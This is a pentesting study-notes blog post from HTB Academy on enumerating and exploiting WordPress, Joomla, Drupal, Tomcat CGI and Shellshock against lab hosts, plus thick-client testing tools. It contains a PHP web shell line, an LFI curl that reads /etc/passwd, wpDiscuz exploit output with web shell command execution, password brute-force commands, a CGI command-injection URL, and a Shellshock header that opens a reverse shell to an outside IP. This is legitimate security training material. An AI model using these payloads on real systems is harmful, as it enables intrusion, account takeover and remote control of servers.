---
title: "attacking common applications"
date: 2026-07-29 12:00:00 +0300
categories: [Writeups, HTB Academy]
tags: [htb-academy, notes, cybersecurity, pentesting, methodology]
description: "Enumerating and exploiting CMS platforms (WordPress, Joomla, Drupal), Tomcat manager, Jenkins, and default credential spraying."
image:
  path: /assets/img/posts/attacking_common_applications.jpg
  alt: attacking common applications
---

### application discovery and enumeration

An example OneNote (also applicable to other tools) structure may look like the following for the discovery phase:

`External Penetration Test - <Client Name>`

- `Scope` (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy)
- `Client Points of Contact`
- `Credentials`
- `Discovery/Enumeration`
    - `Scans`
    - `Live hosts`
- `Application Discovery`
    - `Scans`
    - `Interesting/Notable Hosts`
- `Exploitation`
    - `<Hostname or IP>`
    - `<Hostname or IP>`
- `Post-Exploitation`
    - `<Hostname or IP>`
    - `<Hostname or IP>`

# Content Management Systems (CMS)

## Wordpress

### **Enumerating Users**

We can do some manual enumeration of users as well. As mentioned earlier, the default WordPress login page can be found at `/wp-login.php`.

if valid username wrong password entered, the site will tell wrong password, 

if invalid username entered, the site will tell not registered

### **WPScan**

[WPScan](https://github.com/wpscanteam/wpscan) is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a blog are outdated or vulnerable. It’s installed by default on Parrot OS but can also be installed manually with `gem`.

```
        shellsession
Fau5t@htb[/htb]$ sudo gem install wpscan
```

WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from [WPVulnDB](https://wpvulndb.com/), which is used by WPScan to scan for PoC and reports. The free plan allows up to 25 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the `--api-token parameter`.

The `--enumerate` flag is used to enumerate various components of the WordPress application, such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups. However, specific arguments can be supplied to restrict enumeration to specific components. For example, all plugins can be enumerated using the arguments `--enumerate ap`. Let’s invoke a normal enumeration scan against a WordPress website with the `--enumerate` flag and pass it an API token from WPVulnDB with the `--api-token` flag.

do not forget to look into wp-content/ plugin pages, the wp-upload pages etc

### **Login Bruteforce**

WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and john). The tool uses two kinds of login brute force attacks, [xmlrpc](https://kinsta.com/blog/xmlrpc-php/) and wp-login. The `wp-login` method will attempt to brute force the standard WordPress login page, while the `xmlrpc` method uses WordPress API to make login attempts through `/xmlrpc.php`. The `xmlrpc` method is preferred as it’s faster.

```
        shellsession
Fau5t@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

### **Code Execution**

With administrative access to WordPress, we can modify the PHP source code to execute system commands. Log in to WordPress with the credentials for the `john` user, which will redirect us to the admin panel. Click on `Appearance` on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead.

Click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell.

```php
        php
system($_GET[0]);
```

The [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module from Metasploit can be used to upload a shell and execute it automatically.

### **Leveraging Known Vulnerabilities**

Over the years, WordPress core has suffered from its fair share of vulnerabilities, but the vast majority of them can be found in plugins. According to the WordPress Vulnerability Statistics page hosted [here](https://wpscan.com/statistics), at the time of writing, there were 23,595 vulnerabilities in the WPScan database. These vulnerabilities can be broken down as follows:

- 4% WordPress core
- 89% plugins
- 7% themes

The number of vulnerabilities related to WordPress has grown steadily since 2014, likely due to the sheer amount of free (and paid) themes and plugins available, with more and more being added every week. For this reason, we must be extremely thorough when enumerating a WordPress site as we may find plugins with recently discovered vulnerabilities or even old, unused/forgotten plugins that no longer serve a purpose on the site but can still be accessed.

Note: We can use the [waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.

#### **Vulnerable Plugins - mail-masta**

Let's look at a few examples. The plugin [mail-masta](https://wordpress.org/plugins/mail-masta/) is no longer supported but has had over 2,300 [downloads](https://wordpress.org/plugins/mail-masta/advanced/) over the years. It's not outside the realm of possibility that we could run into this plugin during an assessment, likely installed once upon a time and forgotten. Since 2016 it has suffered an [unauthenticated SQL injection](https://www.exploit-db.com/exploits/41438) and a [Local File Inclusion](https://www.exploit-db.com/exploits/50226).

Let's take a look at the vulnerable code for the mail-masta plugin.

```php
        php
<?phpinclude($_GET['pl']);global $wpdb;$camp_id=$_POST['camp_id'];$masta_reports= $wpdb->prefix. "masta_reports";$count=$wpdb->get_results("SELECT count(*) cofrom  $masta_reports where camp_id=$camp_id and status=1");echo $count[0]->co;?>
```

As we can see, the `pl` parameter allows us to include a file without any type of input validation or sanitization. Using this, we can include arbitrary files on the webserver. Let's exploit this to retrieve the contents of the `/etc/passwd` file using `cURL`.

```
        shellsession
Fau5t@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwdroot:x:0:0:root:/root:/bin/bash
```

#### **Vulnerable Plugins - wpDiscuz**

[wpDiscuz](https://wpdiscuz.com/) is a WordPress plugin for enhanced commenting on page posts. At the time of writing, the plugin had over [1.6 million downloads](https://wordpress.org/plugins/wpdiscuz/advanced/) and over 90,000 active installations, making it an extremely popular plugin that we have a very good chance of encountering during an assessment. Based on the version number (7.0.4), this [exploit](https://www.exploit-db.com/exploits/49967) has a pretty good shot of getting us command execution. The crux of the vulnerability is a file upload bypass. wpDiscuz is intended only to allow image attachments. The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution. More on the mime type detection functions bypass can be found [here](https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/).

The exploit script takes two parameters: `-u` the URL and `-p` the path to a valid post.

```
        shellsession
Fau5t@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1---------------------------------------------------------------[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution[-] File Upload Bypass Vulnerability - PHP Webshell Upload[-] CVE: CVE-2020-24186[-] https://github.com/hevox---------------------------------------------------------------[+] Response length:[102476] | code:[200][!] Got wmuSecurity value: 5c9398fcdb[!] Got wmuSecurity value: 1[+] Generating random name for Webshell...[!] Generated webshell name: uthsdkbywoxeebg[!] Trying to Upload Webshell..[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot;> id[x] Failed to execute PHP code...
```

The exploit as written may fail, but we can use `cURL` to execute commands using the uploaded web shell. We just need to append `?cmd=` after the `.php` extension to run commands which we can see in the exploit script.

```
        shellsession
Fau5t@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=idGIF689a;uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

In this example, we would want to make sure to clean up the `uthsdkbywoxeebg-1629904090.8191.php` file and once again list it as a testing artifact in the appendices of our report.

## Joomla

### **Enumeration**

Let's try out [droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.

We can clone the Git repo and install it manually or install via `pip`.

The default administrator account on Joomla installs is `admin`, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing. We can use this [script](https://github.com/ajnik/joomla-bruteforce) to attempt to brute force the login.

```
        shellsession
Fau5t@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr adminadmin:admin
```

## Drupal

### enumeration

droopescan

```bash
droopescan scan drupal -u http://drupal.inlanefreight.local
```

## Tomcat

enumaration can be done with gobuster or grepping version by yourself

`CVE-2019-0232` is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the `enableCmdLineArguments` feature enabled. An attacker can exploit this vulnerability by exploiting a command injection flaw resulting from a Tomcat CGI Servlet input validation error, thus allowing them to execute arbitrary commands on the affected system. Versions `9.0.0.M1` to `9.0.17`, `8.5.0` to `8.5.39`, and `7.0.0` to `7.0.93` of Tomcat are affected.

```bash
 ffuf -w /usr/share/dirb/wordlists/common.txt -u 
 http://10.129.204.227:8080/cgi/FUZZ.bat
 
`http://10.129.204.227:8080/cgi/welcome.bat?&dir`
`http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`
```

Perhaps the most well-known CGI attack is exploiting the Shellshock (aka, "Bash bug") vulnerability via CGI. The Shellshock vulnerability ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) was discovered in 2014, is relatively simple to exploit, and can still be found in the wild (during penetration tests) from time to time. 

### **CGI Attacks**

Perhaps the most well-known CGI attack is exploiting the Shellshock (aka, "Bash bug") vulnerability via CGI. The Shellshock vulnerability ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) was discovered in 2014, is relatively simple to exploit, and can still be found in the wild (during penetration tests) from time to time. It is a security flaw in the Bash shell (GNU Bash up until version 4.3) that can be used to execute unintentional commands using environment variables. At the time of discovery, it was a 25-year-old bug and a significant threat to companies worldwide.

### **Enumeration - Gobuster**

We can hunt for CGI scripts using a tool such as `Gobuster`. Here we find one, `access.cgi`.

```
        shellsession
Fau5t@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

```bash
Fau5t@htb[/htb]$ curl -H 
'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1'
 http://10.129.204.231/cgi-bin/access.cgi
```

## **Attacking Thick Client Applications**

### **Information Gathering**

In this step, penetration testers have to identify the application architecture, the programming languages and frameworks that have been used, and understand how the application and the infrastructure work. They should also need to identify technologies that are used on the client and server sides and find entry points and user inputs. Testers should also look for identifying common vulnerabilities like the ones we mentioned earlier at the end of the [About](https://academy.hackthebox.com/app/module/113/section/2139##About) section. The following tools will help us gather information.

|  |  |  |  |
| --- | --- | --- | --- |
| [CFF Explorer](https://ntcore.com/?page_id=388) | [Detect It Easy](https://github.com/horsicq/Detect-It-Easy) | [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) | [Strings](https://learn.microsoft.com/en-us/sysinternals/downloads/strings) |

### **Client Side attacks**

Although thick clients perform significant processing and data storage on the client side, they still communicate with servers for various tasks, such as data synchronization or accessing shared resources. This interaction with servers and other external systems can expose thick clients to vulnerabilities similar to those found in web applications, including command injection, weak access control, and SQL injection.

Sensitive information like usernames and passwords, tokens, or strings for communication with other services, might be stored in the application's local files. Hardcoded credentials and other sensitive information can also be found in the application's source code, thus Static Analysis is a necessary step while testing the application. Using the proper tools, we can reverse-engineer and examine .NET and Java applications including EXE, DLL, JAR, CLASS, WAR, and other file formats. Dynamic analysis should also be performed in this step, as thick client applications store sensitive information in the memory as well.

|  |  |  |  |
| --- | --- | --- | --- |
| [Ghidra](https://www.ghidra-sre.org/) | [IDA](https://hex-rays.com/ida-pro/) | [OllyDbg](http://www.ollydbg.de/) | [Radare2](https://www.radare.org/r/index.html) |
| [dnSpy](https://github.com/dnSpy/dnSpy) | [x64dbg](https://x64dbg.com/) | [JADX](https://github.com/skylot/jadx) | [Frida](https://frida.re/) |

### **Network Side Attacks**

If the application is communicating with a local or remote server, network traffic analysis will help us capture sensitive information that might be transferred through HTTP/HTTPS or TCP/UDP connection, and give us a better understanding of how that application is working. Penetration testers that are performing traffic analysis on thick client applications should be familiar with tools like:

|  |  |  |  |
| --- | --- | --- | --- |
| [Wireshark](https://www.wireshark.org/) | [tcpdump](https://www.tcpdump.org/) | [TCPView](https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview) | [Burp Suite](https://portswigger.net/burp) |

### **Server Side Attacks**

Server-side attacks in thick client applications are similar to web application attacks, and penetration testers should pay attention to the most common ones including most of the OWASP Top Ten.
